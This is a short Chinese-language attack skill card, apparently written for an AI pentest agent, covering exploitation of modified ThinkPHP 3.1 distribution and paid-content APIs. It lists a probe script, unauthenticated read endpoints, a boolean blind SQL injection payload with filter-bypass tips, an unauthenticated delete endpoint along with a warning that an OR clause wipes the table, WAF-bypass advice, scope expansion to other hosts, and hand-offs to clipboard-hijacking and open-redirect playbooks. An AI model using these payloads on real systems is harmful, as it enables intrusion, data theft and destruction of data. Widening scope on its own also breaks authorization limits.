---
name: 幻三·分销
description: >-
  ThinkPHP 3.1.x 魔改 + uni-app 分销/知识付费 API 族。用户或现场出现：
  ThinkPHP3.1、/ThinkPHP/README.md、ApiUserFenxiao、get_fenxiao_db_data、
  admin_now_money、common_get_author_list、common_send_sms、
  save_agency_contract、AppVersion/chk_update、message_delete、
  user_weixin_login、state=STATE、剪贴板劫持、TRC20 替换、隐藏后端 baseURL 时立刻使用。
  默认跑 tp3_fenxiao_probe。禁止 message_delete 带 OR。TP5 RCE 仍走 ThinkPHP 总卡。
---

# ThinkPHP 3.x 魔改分销 API

真源：`传承/幻三·分销.md`

```bash
python3 炼蛊房/tp3_fenxiao_probe.py doctor
python3 炼蛊房/tp3_fenxiao_probe.py -u https://授权站 --case <案>
```

WAF 拦 TP5 `invokefunction` **不算结案**。JS `baseURL` 异 host → `scope_expand` 后复打。

## 四刀

1. **认族** — `/ThinkPHP/README.md` 含 3.1 / 魔改；路由 `/index.php/ApiUserFenxiao/`  
2. **无鉴权读** — `get_fenxiao_db_data` `get_agency_contract` `get_my_data?user_id=`  
3. **SELECT 布尔** — `common_get_author_list?limit=10 AND 1=1` vs `AND 1=2`；`>` `<` 常被 `where()` 滤掉，改 `=` + `MID`/`ORD`  
4. **写点先停** — `message_delete` 只打 `id=0` 证明无鉴权；**禁止 `id=0 OR`**（会清空表）。`test_pay_success` / GET 写合同 → `--write` 且先问

## 失败 / 交接

`/?a=1` 打出 APP_DEBUG 路径仍要继续 API 面。剪贴板换 TRC20 → `usdt-deposit-attribution-hijack`。微信 `Location?code=` → `open-redirect-chain`。
